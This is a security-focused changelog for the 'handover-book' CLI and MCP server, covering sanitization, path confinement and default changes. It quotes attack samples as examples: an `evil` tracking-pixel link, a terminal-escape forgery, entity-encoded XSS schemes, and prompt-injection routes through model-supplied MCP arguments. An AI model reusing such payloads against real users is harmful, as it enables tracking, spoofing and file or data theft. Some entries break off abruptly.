# Changelog

Notable changes to the `handover-book` npm package and the CLI. Dates are UTC.

## 0.1.3 — 2026-09-29

Review rounds five and four first (a full read of every shipped source file, then a full audit of the working tree), then the third and second rounds' entries beneath them.

**Security**

- The git collector now re-checks the toplevel that `git rev-parse --show-toplevel` reports: a `.git` *pointer file* (`gitdir: …`) or a repo-configured `core.worktree` could resolve it anywhere on disk, reading an arbitrary clone outside the directory `confineGitDir` had just authorized.
- On Windows, `git` is spawned by its absolute path (resolved once via System32's own `where.exe`). `CreateProcess` searches the calling process's working directory for a bare executable name — and the MCP server's cwd is the model-writable workspace, so a planted `git.exe` there would have been the binary that runs.
- `GitHubCollector` validates a caller-supplied `baseUrl` in its constructor (https unless loopback, no embedded credentials). The host allow-list for `GITHUB_API_URL` stays in `loadConfig`; the constructor check closes the library path that bypassed it.
- `handover risk --json` now redacts evidence excerpts and rationales, like the MCP path always did — `--json` exists for CI, and CI logs are exactly where a verbatim commit message with a plaintext secret should not land.
- The HTML entity decoder's named-entity table has a null prototype: `&constructor;` / `&valueOf;` used to resolve through `Object.prototype` into function source text. Not exploitable as a scheme (the inherited values contain no colon), but wrong.
- Evidence sanitization now also strips isolated carriage returns: a bare `\x0d` rewinds a terminal's cursor and lets the rest of the line overwrite what the tool printed — impersonation with no escape code at all.
- `neutralizeGeneratedMarkup` now also rewrites reference-style link definitions (`[id]: javascript:…`) in LLM chapter text: the inline `](…)` scanner could not see them, because the target sits on a different line than its use. The HTML twin was already covered by its own sanitizer; this closes the same scheme in the `.md` book.

**Fixed**

- A full re-index of a repo whose checkout currently has no commits (orphan branch, empty clone) no longer prunes the repo's entire indexed history. An empty log is a branch state, not proof the evidence is stale.
- `collect -r` no longer silently shrinks the index: repositories removed because they fell out of the `-r` scope are announced with a warning before the orphan cleanup deletes them.
- `handover verify` no longer treats every bracketed 7–40-digit hex token in prose as a commit citation — `[20240101]` in a captured answer used to fail a clean book. Short tokens must contain at least one hex letter; 40-character shas pass as written.
- The git collector pins `log.mailmap=false` and runs with `LC_ALL=C`: attribution no longer drifts with the machine's global git config, and the "no commits yet" recognition no longer depends on git speaking English.
- `handover render` (library path) refuses to run against a missing index *before* opening the store — it used to create an empty `<user>.db` that then satisfied the "run collect first" guard forever.
- Bug-labelled issue correlation matches whole labels (`bug`, `regression`), not substrings — a `debugging` label no longer raises a module's incident weight.
- Bus factor marks a module `fragile` when three or more authors exist but one holds ≥90% of the commits; it used to read as `shared`.
- CODEOWNERS lookup precedence now matches GitHub's (root, then `.github/`, then `docs/`); the local collector used to prefer `.github/`.
- git subprocesses time out after 10 minutes instead of hanging forever on a wedged git.
- `renderHandoverBook`'s options type no longer advertises `gitDirs`/`authorIdentity` it silently ignored (Omit).
- `handover gate`'s exit-code semantics are documented: `--fail-on-match` exits 1 on a hit, and a failed run also exits 1 — check stderr to tell them apart.
- The store now sanitizes repository/sha keys on *every* lookup, not just on insert: a repo key carrying an invisible character (a local clone's directory basename can) was stored sanitized but deleted, pruned and scope-checked with the raw spelling — orphaning child rows, and making `clearRepositoriesExcept` wipe the very repo it was told to keep. The git collector also sanitizes the basename when it derives the key, so both spellings can never diverge in the first place.
- `resolveNumstatPath`'s octal decoder no longer truncates literal non-ASCII characters: with `core.quotePath=false` a path can mix raw UTF-8 with octal escapes, and pushing `charCodeAt` straight into a byte buffer masked every code above 255 (支 became "/"). Surrogate pairs are decoded as one code point.
- The MCP `handover_render` tool's `repos` argument now carries length bounds (≤100 entries, ≤512 chars each), and `handover_generate`/`handover_collect` cap `repos` at 100 entries and `authorIdentity` at 320 characters — they were the last model-supplied lists with no bound.
- The evidence digest is no longer built when LLM synthesis is off (the default): building it walks every PR, review and comment in the index, and nothing read the result on that path.
- The lockfile root again carries the `package.json` version: the 0.1.3 bump never ran `npm install`, and `npm ci` tolerates the drift silently. The dependency contract test now fails on a lockfile whose root name/version disagrees with the manifest.

**Docs**

- The Ollama path in every README now shows `--provider ollama --use-llm` and says `--use-llm` is required — `--provider` alone selects the provider and silently produced deterministic chapters.
- The example gate workflow no longer claims its `RUNNER_TEMP` index is "cached between runs" — every run collects fresh.
- `confineGitDir` is exported from the package entry point (its sibling `confineDataDir` already was).
- The dependency contract test now covers scoped packages: the top-level filter dropped everything containing a slash, which quietly excluded every `@`-scoped runtime dependency from the exact-pin + integrity check.
- The package gate checks every `files` entry actually contributed tarball content — a renamed screenshot or moved `examples/` tree used to drop out silently.

**Third review round (read-only audit of the whole tree, same unreleased batch)**

*Security*

- The MCP server confines `gitDirs` the same way it confines `dataDir`. `gitDirs` points the collector at a git repository on disk — `git log` then reads every commit message, path and author inside it — and it arrived from the model with no constraint, so one injected instruction could read any clone on the machine into the transcript. Allowed roots: the server's working directory, `HANDOVER_DATA_ROOT`, and a new comma-separated `HANDOVER_GIT_ROOT`. Existing symlinks/junctions are resolved before the check.
- `confineDataDir` resolves symlinks/junctions before its root check; a junction inside an allowed root used to be able to point the write outside it.
- `GITHUB_API_URL` validation compares the host **with** its port: `https://api.github.com:8443/` used to pass a hostname-only check and send `GITHUB_TOKEN` to a port the allow-list never meant. A bare host entry covers the default port; an explicit `host:port` entry is the only way to allow a non-default one.
- Evidence excerpts and prose built from untrusted text no longer leave markdown link/image syntax live: `tableCell` and `escapeHtmlText` neutralize `!`, `[`, `]` (and backslash, before the pipe) — a commit message like `![x](http://evil/pixel?u=me)` used to render as a live tracking pixel in the book. `tableCell` also escapes the backslash first, so a literal `a\|b` no longer splits the table column.
- Captured-answer strings and repo arguments in the MCP server now carry shape/length bounds (answers ≤ 10 000 chars; `repos` must be `owner/name`).

*Fixed*

- `handover collect` without `-r`/`-d` now stops at the validation error instead of continuing to create an empty index — which silently defeated the "run collect first" guard for `risk`/`gate`/`verify`. `handover_collect` (MCP) validates before opening the store for the same reason.
- Risk scoring: `soleReviewer` counts distinct reviewers across distinct PRs. The old row count read the common approve → re-request → approve pattern on one PR as "all reviews were by one person" and inflated irreplaceability by +0.5.
- `handover search --since` compares timestamps, not strings. Indexed dates carry no milliseconds while `since` normalizes to `…:00.000Z`, and `"Z" > "."` lexicographically, so a record at exactly the boundary slipped *into* a window that starts after it.
- Evidence sanitization strips Unicode bidi reordering (U+202A-202E, U+2066-2069), LRM/RLM and zero-width characters, closing the trojan-source-style render gap in commit messages, PR text and the book.
- `handover verify` accepts upper-case commit citations (normalized for the index lookup); it previously reported every upper-case ref as missing.
- The package-gate tests run `tar` with a relative archive name — on Windows, GNU tar read the drive letter of an absolute path as a remote host ("Cannot connect to C:") and five tests failed for the wrong reason.
- Username validation now also runs inside the exported library API (`generateHandoverBook`/`renderHandoverBook`), not only at the CLI/MCP boundary — file names derive from it, so a library caller passing `../..` could write outside the data directory.

*Docs*

- Every README now lists all seven MCP tools including `handover_verify`, which existed in code and in the server's own tool test but was missing from all ten of them ("same six tools everywhere").
- The translated READMEs no longer claim LLM synthesis runs by default when a provider is configured — the opposite of the 0.1.3 opt-in default — and state the `--use-llm` condition wherever chapters 4-6 are described.
- A docs-contract test now pins the MCP tool list in every README against `src/mcp.ts`, so a registered-but-undocumented tool fails CI instead of shipping invisible.

**Second review round (release-integrity audit: code, dependencies, release alignment, CI, runtime)**

The headline is a **breaking default change**: LLM synthesis is now opt-in, because the previous default sent repository content to a provider for anyone who happened to have `ANTHROPIC_API_KEY` exported.

**Breaking changes**

- **LLM synthesis is off by default.** Chapters 4-6 use the deterministic fallbacks unless you pass `--use-llm` or set `HANDOVER_LLM=1`. `--no-llm` still works and is now the default.
- **Secret redaction is on by default.** The LLM digest and the rendered book are scrubbed unless you pass `--no-redact` or set `HANDOVER_NO_REDACT=1`.
- `GITHUB_API_URL` is validated: https only, no embedded credentials, and the host must be `api.github.com` or one listed in `HANDOVER_GHE_HOST`. A stray or injected value used to be able to carry `GITHUB_TOKEN` to any host.

**Security**

- `handover bus-factor` no longer hangs on a hostile `CODEOWNERS` file. Patterns were translated into a regex where every `*` became a backtracking group, so a 36-character line cost ~7 seconds and a 40-character one ~20 seconds against a non-matching path — both halves of that pair are repository-supplied. Matching is now a bounded dynamic-programming glob with an explicit wildcard budget (test: `*a` × 40 returns immediately).
- The MCP server confines `dataDir`. It is a model-supplied argument, and the pipeline creates the directory and writes `<user>.db` and the book into it, so an injected instruction could create directories and clobber files anywhere the process could write. Allowed roots: the server's working directory, plus one optional `HANDOVER_DATA_ROOT`. The CLI keeps taking any path — there, the person typing it is the one authorizing it.
- LLM-generated chapters are neutralized before they are bound into the **markdown** book. The HTML twin had a sanitizer; the `.md` file — the primary artifact, opened in editors and wikis — took model output raw, and model output quotes content an outside contributor controls (anyone who can open a PR picks its title and body). Raw markup and non-HTTP link schemes are now inert in both.

**Reliability**

- `git` invocations in the collector pass `--no-pager`, `core.fsmonitor=false`, pager and external-diff disabled, and `--no-ext-diff`. **These are hardening, not a fix for a demonstrated hole**: control tests on git 2.53 showed `git log --numstat` never invokes a repo-configured `textconv` driver, and git disables the pager on its own when stdout is not a TTY — so the vector that motivated the flags is not reachable through the commands this collector runs today. They stay because they cost nothing, are inert for normal repositories, and become load-bearing if the log invocation widens (`-p` would put textconv back on the table). `--since` is passed as one `=`-joined token and re-validated at the collector boundary, which is the part with a concrete failure mode.
- GitHub requests now carry a per-request timeout (60s default) that bounds one attempt, matching the LLM client. A hung connection previously stalled a multi-hour collect indefinitely: retries existed but nothing bounded a single attempt. Worst case for one request is therefore `4 × timeout + backoff` (≈4 minutes at the default), which is a bound, not a promise of promptness. Both values are now configurable — `HANDOVER_GITHUB_TIMEOUT_MS`, `HANDOVER_LLM_TIMEOUT_MS` — partly so the abort path can be tested: **verified against a server that accepts connections and never replies** (GitHub collector gives up in 15.7 s with its 400 ms test timeout, LLM provider in 7.2 s), with a positive control asserting the request actually reached the server, since a test that never connected would pass for the wrong reason.
- Interrupted runs release the SQLite handle; `releaseOpenStores()` is exported so embedders can do the same deliberately. Verified by reopening and reading the data back, and by the directory becoming removable (Windows file locking makes a lingering handle observable). What is *not* verifiable from a test on Windows is the signal delivery itself — a killed child process does not run its handlers there — so the claim is limited to the release step the handlers call.
- `Ctrl-C` closes the SQLite handle instead of leaving it hot (SIGINT/SIGTERM), which on Windows meant the next run waited out the busy timeout against a locked file.
- Memory: the whole-index readers no longer materialize the entire history. Risk scoring, bus factor, module stats and the evidence search stream one commit at a time; the action page's commit counts come from SQL aggregates; `handover verify` reads only shas. A multi-year monorepo index used to be summed and thrown away at full size.

**Hardening round four (differential testing of the rewrite itself)**

- The CODEOWNERS matcher rewrite was checked against the implementation it replaced, over a corpus of realistic patterns × paths, and that comparison **found a regression I had introduced**: a bare directory rule (`docs`) stopped matching `docs/README.md`. The regex carried a `(?:$|/.*)` tail that let the last pattern segment be a directory of the path; the new segment matcher only did that for slash-containing patterns. Fixed, and the corpus is now an executable contract (`test/busfactor.test.ts`) covering bare directory rules at any depth, `*` not crossing a file suffix, `src/*/internal/**` scoping, and `**/README.md` matching the repository root — the one case where the new matcher deliberately differs from the old, because `(?:.*/)?` required a directory level that `**` does not.
- Measured the streaming readers rather than asserting them: 20 000 commits × 8 files went from 244 MB to 106 MB resident (separate processes, so the figure is not polluted by the previous run's heap), and `iterCommits` is also faster than `allCommits` (31 ms vs 48 ms) because the whole `commit_files` scan and its Map of per-commit arrays are gone.
- The same treatment for the conversation tables, which the first pass had left materialized: `computeRisk`, `handover verify` and the action page now read `reviewerRows()` (repo/id/pr/reviewer, no comment payloads), `issueLabelRows()` (no titles or bodies) and a `recordCounts()` SQL aggregate — 5 000 PRs + 5 000 reviews + 5 000 issues, each with four comments, went from 115 MB to 47 MB with the counts identical. The committed sample book was regenerated as a cross-check: its action page counts (25 commits, 4 PRs, 4 reviews, 3 issues) come out unchanged, and the only diff is the timestamp plus the new Redaction line. `synthesizing the digest` and `search` still read comment bodies — they genuinely quote them.
- Every third-party GitHub Action reference in `.github/workflows/` and `examples/` (9 in total) is now pinned to a full commit SHA with a version comment — `actions/checkout@11d5960a… # v4` and `actions/setup-node@49933ea5… # v4`, each SHA cross-checked against the upstream `tags` ref *and* the `action.yml` at that commit. A fifth CI gate, `Third-party actions are pinned to commit SHAs`, fails if a mutable tag reappears anywhere; it was verified in both directions (clean = pass, injected `actions/checkout@v4` = fail with the offending line).
- The pack-verification steps no longer write to `/tmp`, which is not portable in the way the step assumed; they use `$RUNNER_TEMP`, the runner's guaranteed-writable scratch dir, and the whole pack→extract→verify sequence was executed locally before being trusted to CI.
- Confirmed the ReDoS bound still holds after adding the bare-directory branch: 20 wildcards 0.07 ms, 80 wildcards 0.00 ms, and 20 000 realistic rule evaluations over 4 rules in 56 ms.

**Hardening round twenty-four (executing the workflow other teams copy, and the WSL trap it landed in)**

`examples/sole-owner-gate-action.yml` is the one artifact whose failure mode lives in somebody else's repository: if its `grep -c` detector stops matching `gate --comment` output, the bot goes silent and every PR passes. Nothing had ever run it.

- `scripts/smoke.mjs` now pulls both shell snippets out of the example file and *executes* them: the `Refuse to run unpinned` guard is run against `HANDOVER_VERSION` of empty / `latest` / `0.1.3` and must refuse, refuse, accept; and the detector pattern is read out of the `Gate` step and applied to the comment the installed CLI really prints, where it must match a hitting file list and match nothing on a clean one. Reading them out of the file rather than restating them here is the point — a copy of the logic in the test would drift exactly like the example does.
- Getting that check honest took three attempts, each one a **false green**:
  - `spawnSync('/usr/bin/env', ['bash', …])` — the portable-looking spelling — is simply absent under a Windows `node.exe`, so every case reported a non-zero status, which the first version read as "the guard refused". Two of three cases passed by accident. A spawn that never started is now asserted separately from a refusal.
  - Under WSL2 the local `node` is the Windows binary while `bash` is the Linux one, and **a `-c` script string crossing that boundary is expanded by a shell before `bash` parses it**: `"$HANDOVER_VERSION"` arrived already empty (`echo $BASH_VERSION` arrived as `echo 5.3.9(1)-release`, which is only possible if something substituted it), so every case refused again. Feeding the snippet on **stdin** (`bash -s`) gives refuse / refuse / accept. Passing the value through the `env` option is not a way out either — Windows environment variables do not reach that bash at all.
  - The extraction itself dedented by the least-indented line of the *rest of the file*, so each block ran to the end of the workflow and failed on the next step's `npm install`. The smoke run now asserts a block stayed inside its own step before running it, and all three layers are pinned in `test/smoke.test.ts` so the `-c` form cannot come back.
- `process.platform !== 'win32'` had been skipping these cases on every WSL checkout — the same silent-coverage hole the minimum-checks floor exists to catch. The guard is now a `bash --version` probe, and a host with no bash prints that the cases were skipped instead of quietly counting fewer checks.
- **A documentation defect that a documentation test could not see:** nine translated READMEs described `--redact` as something you turn on ("also `HANDOVER_REDACT=1`") and listed `--no-redact` as a bare, unglossed flag — while redaction has been **on by default** since the 0.1.3 default change. The existing contract test that requires `--no-redact` wherever `--redact` appears passed on all nine, because token presence is not meaning. Each translated README now states the default and names `HANDOVER_NO_REDACT=1`; `.env.example` already documented both spellings correctly.
- The replacement rule is derived from the CLI rather than from a wish list: it parses the options in the `⚠ overrides a safety default` help group, takes the env spelling out of each one's own help string, and requires every README and agent doc that names the flag to name that variable too — with the parsed set asserted non-empty so it cannot be made vacuous by deleting the group. **It immediately caught two more:** `codex/handover.md` and `plugin/commands/gen.md` told an agent about `--use-llm` without ever naming `HANDOVER_LLM=1`, which is the route that uploads *without any flag on the command line*. `gen.md` now says to check the environment before running.
- `handover gen`'s own upload notice (`src/pipeline.ts`) told the reader, in the sentence where content is described leaving the machine, to "Set `HANDOVER_NO_REDACT=1` only if you know the history is clean" — naming the least-safe action without saying it disables the scrubbing. It now states that secrets are scrubbed on the way out and what turning that off means.
- Two of my own artifacts were caught by the checks meant to catch other people's: this file's prose wrote the issue-template convention with a placeholder filename in the `template=` position, which the template-existence rule read as a real filename (now spelled `<name>.yml`, and the rule's failure message names that remedy), and a smoke label said "the shipped example refuses `\"\"`" while reporting a case that had *accepted* it.
- Verified: **29 files / 284 tests** pass, typecheck clean in both configurations, build succeeds, `check-package` audits the tarball at 106 entries with the promised bin entries and no local data, and smoke is at **93 checks** against the packed artifact. `check-release` still refuses to publish 0.1.3 — uncommitted changes and no `v0.1.3` tag — which is the guard doing its job, not a defect.

**Hardening round twenty-three (running the README, not just the program)**

The smoke suite executed the *code*. The quick start in the README is a different claim: it says what happens when you install globally, and what happens when you run from source. Neither had ever been executed by anything.

- `scripts/smoke.mjs` now performs the README's own first command — `npm install -g handover-book` into a throwaway prefix — finds the resulting `handover` shim (`.cmd` in the prefix on Windows, `bin/handover` elsewhere), and runs `--version`, `gen --git-dir …`, and `verify` through it, asserting the deterministic-default line and the `handover-data/<user>.db` + `handover-book-<user>.md` layout the README documents. **13 new checks.** A package whose CLI works through `npx` and not after a global install is precisely what a first-time user would meet, and nothing tested the global path.
- It then runs the README's contributor route — `npm run dev -- gen …` — when invoked from a checkout, which is the only way the `npm run <script> -- <args>` passthrough in the documentation gets verified: it is npm behaviour, not code, so no unit test can notice it breaking. Binding: renaming the `dev` script's target made the check report both the failure and the missing book.
- Blank `OPENAI_API_KEY` / `ANTHROPIC_API_KEY` for the global-install run, so the "nothing leaves this machine" assertion means something on a developer machine that has one set for other tooling — and so a future default flip cannot pass silently there.
- The minimum-checks floor went from 30 to 60 (the suite is at 78), and Node's deprecation about argument arrays under `shell: true` was removed by building one quoted command line — the same approach the `npm` helper already used.
- `test/docs-contract.test.ts` gained the counterpart to its "skip query-string links" rule: every `?template=<name>.yml` referenced anywhere in the docs must exist under `.github/ISSUE_TEMPLATE/`, and the test fails if no template is referenced at all, so the rule cannot become vacuous by deletion.
- Recorded rather than hidden: one probe of mine used a Windows-style path with WSL's `mkdir`, which created a literal `C:` directory **inside the repository** — removed, working tree verified back to its prior state. The same class of mistake is why the artifact paths in this suite are quoted and resolved absolutely.
- Also verified by hand this round, with output: the CLI's "Not a git repository: … — pass the clone's directory to `--git-dir`" error is actionable as written, and `npm run dev -- gen …` produces a book and index from source.
- Suite unchanged at **29 files / 282 tests**; smoke now **78 checks** against the packed artifact.

**Hardening round twenty-two (the dependency questions that were answered by reading, not checking)**

Binding: moving `zod` into `devDependencies` made the second check name it.

Every runtime dependency except the MCP SDK is at its latest published version; the SDK is one minor behind, and Dependabot's `npm` ecosystem covers it.
- `docs/install-verification.md` now records which dependency facts are checked in CI and which were answered out-of-band, so the next reader does not re-run the registry queries.

**Hardening round twenty-one (the last unenforced surface: the ten READMEs and the plugin skill)**

- Every translated README documented `--redact` and none mentioned the switch that turns it off; none pointed at the complete variable inventory. All ten now list `--no-redact` in their own flag-list style and link to `.env.example` — the file `test/env-contract.test.ts` already proves complete against the code, which makes it the one inventory a translated page can carry without being translated.
- **Nothing in the documentation linked `.env.example` at all** — not the README, not `CONTRIBUTING`, not the agent docs. The canonical list of what this tool reads was discoverable only by listing the repository. It is linked from all four places now.
- `plugin/skills/handover/SKILL.md` gained a **never echo credentials** rule (do not repeat `GITHUB_TOKEN` or provider keys into the conversation, a tool argument, or a file — including when the user pasted one and asked you to "just use this"). The MCP tool description already said the server never returns environment values; the operative skill file said nothing about the agent's side of it.

**Hardening round twenty (the translations nobody re-read after the defaults changed)**

Round nineteen built a check for the agent-facing docs, so the same question was asked of the human-facing ones. Ten READMEs exist; **nine of them still described the pre-0.1.3 world**, in the quiet direction that makes a feature undiscoverable rather than accidentally dangerous — until you read closely.

- Every translated README documented `--no-llm` and **none mentioned `--use-llm`** — the off-switch for a default that is already off, with no on-switch listed at all. Each one now names `--use-llm` / `HANDOVER_LLM=1` in its own flags list, using the separator that file already uses, and links to the English *LLM providers* section for the prose no machine-translated copy should be trusted to restate. Flag names are code tokens, so that edit needed no translation.
- `README.md` and `README.zh-CN.md` both claimed the GitHub path "**requires** a GitHub token". Public repositories are readable with no token at 60 requests/hour (verified in Record 3); the rows now say that, and keep the token advice for private repos and volume.
- `README.zh-CN.md`'s LLM row went further: it said the run contacts no LLM "when no key is configured" — implying a key in the environment is what decides. Rewritten to the real rule: opt-in via `--use-llm` / `HANDOVER_LLM=1`, and a key alone is not consent.
- Roadmap split to say what is actually verified: anonymous `-r owner/name` collection end-to-end on a public repo is **done**; authenticated collection, private repos, deep pagination and a Unix clean run remain open.
- `test/docs-contract.test.ts` gained three rules so this cannot drift back: a README that mentions the opt-out must mention the opt-in; no document may claim a GitHub token is required; every relative doc link must resolve on disk. The first run of the link rule failed on `../../issues/new?template=false_positive.yml`, which is the hosting convention rather than a path, so query-string links are skipped explicitly — the check earned its keep immediately.
- Binding: the forbidden-claim pattern flags `README.md` and `README.zh-CN.md` at `HEAD` and passes on the corrected files; the discoverability rule flags all nine translations as they were at `HEAD`.
- Suite now at **28 files / 274 tests**, typecheck clean on both configs.

**Hardening round nineteen (the documents an agent reads, checked against the code it drives)**

`codex/handover.md` and the plugin skill are not documentation in the usual sense — they are the instructions an agent follows while handling someone's repository history. Reading them against the code found two more mismatches and one gap.

- **[medium] Both files told agents that `GITHUB_TOKEN` "must be set for anything that touches GitHub"** — which round fourteen disproved for public repositories. The consequence of a stale credential claim in agent-facing text is not confusion but a needless secret: the agent asks the user for a token it does not need, or refuses a path that works. **Hardening round ten (terminal injection through the fields nobody scrubbed)**

- Only commit messages on the **local git** path had their C0 control bytes stripped. Everything else — GitHub-collected commit messages, PR/issue/review titles and bodies, inline comment text, author and reviewer logins, file paths, labels, captured answers, CODEOWNERS owner handles — reached the SQLite index verbatim, and from there reached a terminal (`handover risk`, `bus-factor`) and the book (`cat handover-book-<user>.md`, a wiki, an editor). A commit author can therefore emit `ESC [ 2 J` (clear screen) followed by a forged line such as `GATE APPROVED` in red, from a tool whose entire premise is that a human confirms every claim. Reproduced end to end: `top bob\u001b[2J\u001b[1;31mGATE-APPROVED\u001b[0m@example.com`.

C1 controls (`\u0080-\u009f`) are included, since U+009B is an 8-bit CSI that a non-UTF-8 terminal honours exactly like `ESC [`.

- `test/cli-nollm.test.ts` was widened from one case to four that drive the real CLI end to end: `--no-llm` with a credential present, the default (no contact), `--use-llm` (attempt made, and the run says so), and redaction on by default with `--no-redact` as the only opt-out. Both defects lived in the seam between commander's flag parsing and the pipeline, which a `loadConfig()` unit test cannot see.
- All environment-driven defaults were re-verified through the real CLI process rather than only in-process: default redaction on, `HANDOVER_NO_REDACT=1` off, legacy `HANDOVER_REDACT=1` accepted, both set → off wins, `HANDOVER_LLM=1` opting into synthesis.
- README documents the Windows/WSL storage caveat: an index under a 9P-mounted path (`/mnt/d/…`) can report `database is locked` because byte-range locks are not honored there; keep `--data-dir` on a native filesystem.
- `SECURITY.md` is now reachable from the issue templates (a "Report a security vulnerability" contact link), and `docs/demo-script.md` refers to `--use-llm` instead of the old default-on wording.

**Hardening round two (verification of the above surfaced these)**

- `HANDOVER_REDACT=1` keeps working. Flipping redaction to default-on had silently orphaned it — it is documented in the English README and all nine translations, so the legacy spelling now means "on" (which is already the default) and only `HANDOVER_NO_REDACT=1` changes behavior. Precedence and both spellings are tested.
- `resolveNumstatPath` strips ASCII control bytes from file paths, the way commit messages already did. An octal-escaped path like `\036…` decodes to a byte that is the collector's own record separator, and a `\000` path truncates a module name wherever the book is opened.
- New `test/adversarial-input.test.ts`: a seeded generator feeds repository-shaped and model-shaped garbage (wildcard soup, control bytes, entity-encoded schemes, traversal paths) through `ownersFor`, `resolveNumstatPath`, `parseSince`, `neutralizeGeneratedMarkup`, `redact` and `confineDataDir`, asserting postconditions — no live markup survives neutralizing, `parseSince` never yields a rolled-over date, `confineDataDir` never returns a path outside its roots — plus explicit time budgets. This is the net that catches the next wildcard bomb rather than the one already found.
- New `shipped-examples` CI job. `examples/sole-owner-gate-action.yml` is copied verbatim into other people's repositories, so its properties are now enforced, not just reviewed: the example must install a pinned `handover-book@$HANDOVER_VERSION` and must not clone this repository; no workflow may trigger on `pull_request_target`; no workflow may interpolate `github.event` / `inputs` inside a `run:` block; every workflow must declare `permissions:`. Each check was run against a deliberately violating fixture to confirm it fails for the right reason.

**Supply chain / release integrity**

- `.github/workflows/release.yml`: publishing is tag-driven (`v*.*.*`), the version is read from the tag and required to match `package.json`, the tag must be an ancestor of `main`, and the job runs behind an `npm-publish` environment approval with `id-token: write` for **npm provenance**. Hand-published versions previously drifted from the repository — `0.1.1` carries a `gitHead` pointing at the commit tagged `v0.1.0`, so no tag reproduces it.
- `scripts/check-release.mjs` runs from `prepublishOnly` and refuses to publish a dirty tree, a non-main branch, or a version with no matching annotated tag.
- CI gained a `release-readiness` job: `npm audit --audit-level=high` blocks, new packages with install scripts must be explicitly allow-listed, and every `bin`/`main`/`exports`/`types` entry is checked to exist inside the actual tarball — plus the tarball must not contain `src/`, `test/`, `.env`, `*.db` or `handover-data/`.
- `.github/dependabot.yml` for npm and GitHub Actions; `SECURITY.md` states the threat model (the analyzed repository's content is the untrusted input) and how to report.
- `examples/sole-owner-gate-action.yml` installs a **pinned published version** with `--ignore-scripts` instead of cloning this repository's `main` and building it inside every pull request with a PAT in the environment. It now refuses to run when `HANDOVER_VERSION` is empty or `latest`.
- `.gitignore` covers every `.env*` variant, not just `.env` and `.env.local`.
 Highlights: `--no-llm` now actually works (it previously did not, and repo content could be sent to the LLM provider despite the flag), the HTML report sanitizer is rewritten around a URL-scheme allowlist (closing several XSS routes reachable from malicious repo content), and mixed-case `-r Acme/API` no longer wipes an index collected as `acme/api`.

**Security**

- `--no-llm` is honored: the CLI flag was read from `options.noLlm`, which commander never sets for a `--no-*` flag, so a configured API key sent repository content to the LLM provider despite the flag. Only `HANDOVER_NO_LLM=1` worked. Both `gen` and `render` now map the flag correctly.
- HTML report sanitizer rewritten: URL schemes are now checked against an allowlist (http/https/mailto/relative) after decoding HTML5 named and numeric entities (previously `javascript&colon;`, entity-encoded tabs inside the scheme word, and SVG `<animate attributeName="href">` could smuggle scripts past the denylist; a numeric entity above U+10FFFF crashed the whole render). Out-of-range entities are clamped, `<animate>`/`<set>`/`<foreignObject>` are dropped, and `action`/`formaction` join the checked URL attributes.
- A malformed `<script >` open tag in chapter content no longer swallows the rest of the book (dangerous block-level tags are neutralized in the markdown before parsing, so they render as visible text instead of deleting content).
- Module names interpolated into risk headings and the 30-day path are rendered as inert code spans; a repo directory name containing backticks/markup can no longer inject into the rendered book. Chapter headings keep `&` readable instead of leaking `&amp;` into the markdown source.
- MCP `handover_search` results are secret-scrubbed like the risk tool — excerpts quote raw repository text and are an egress path the redact flag does not cover.

**Data loss / correctness**

- Mixed-case repository names (`-r Acme/API` after `acme/api`) no longer wipe the previously collected history: collection scope is normalized to lowercased slugs before the orphan cleanup, and the recorded repo list matches exactly what survives it.
- A later `-r`-only `collect`/`gen` run no longer wipes locally-collected (`--git-dir`) history: every local clone recorded in the index is preserved, not just the ones passed to the current run (CLI, pipeline and MCP behave identically now).
- Local git collection stores author timestamps normalized to UTC, like the GitHub path — non-UTC repos previously mis-sorted recency evidence and mis-bounded commit windows (all timestamp comparisons are lexicographic). Existing indexes keep their stored form; re-collect with `--refresh` to normalize.
- Amended/rebased-away local commits are pruned on a full re-index, matching the GitHub path's ghost-data contract.
- PR ghost-data prune actually deletes the conversation comments and labels of pruned PRs (the DELETE statements bound `repo` into a number placeholder, so they never matched anything).
- Prune statements no longer fail with "too many SQL variables" on full listings above SQLite's 32,766 bind-variable cap (large repos crashed mid-collect); seen-values are staged in a temp table.
- `handover verify` checks bare `[review:456]` citations — the exact format the LLM system prompt instructs the model to emit — which previously passed unchecked while the command claimed "all cited refs exist".
- Evidence appendix keeps refs that share a number across repositories (`acme/api#12` and `acme/web#12` are no longer deduplicated into one row).
- PR additions/deletions/changed_files are summed from the fetched file pages instead of being persisted as zeros (`pulls.list` does not carry those fields).
- CI bot logins (`dependabot[bot]`, `renovate[bot]`, …) no longer count as authors in ownership ratios, bus-factor headcount, or contributor counts.
- `--since` rejects impossible dates that `Date.parse` silently rolls over (`2024-02-30`, `T24:00`); search with a `since` filter excludes undated records instead of letting them through; legacy PR rows with a NULL `head_sha` are re-fetched once instead of skipping force-push detection forever.
- Local git collection no longer overwrites GitHub's canonical login in `collected_for`, records its `collected_via` source (so the book's Sources line no longer relies on name-shape guessing — same for the CLI `collect` command), and handles repositories whose full `git log` output exceeds any fixed buffer (streamed instead of `execFile`'s 64 MB cap).

**Usability / packaging**

- GitHub Enterprise Server support: set `GITHUB_API_URL` to the instance's API base.
- CODEOWNERS fetch failures from rate limiting (403/429) warn instead of silently vanishing from the bus-factor view.
- `gate --files -` fails with a hint instead of hanging when stdin is a TTY; `capture --answers` reports a missing file with a hint instead of a bare ENOENT; `bus-factor` "quiet" label reflects the requested `--window` instead of a hardcoded "90d"; SQLite sets a busy timeout so concurrent CLI/MCP access waits instead of failing; the risk engine no longer overflows the argument limit on huge module counts.
- npm package ships the README's hero screenshot and the sample report again (broken image/links on npmjs.com).
- Plugin metadata bumped to 0.1.2; SKILL.md chapter 6 renamed to the real "Questions & Draft Answers" with the draft-vs-captured distinction (it claimed the LLM answers spoke in the departing engineer's own voice); all eight community README translations re-synced with the English README (MCP tool count, command table, `--git-dir` no-token path, flags, roadmap, chapter 6 name); `.env.example` gained `HANDOVER_NO_LLM` and `GITHUB_API_URL` and an accurate redact description.
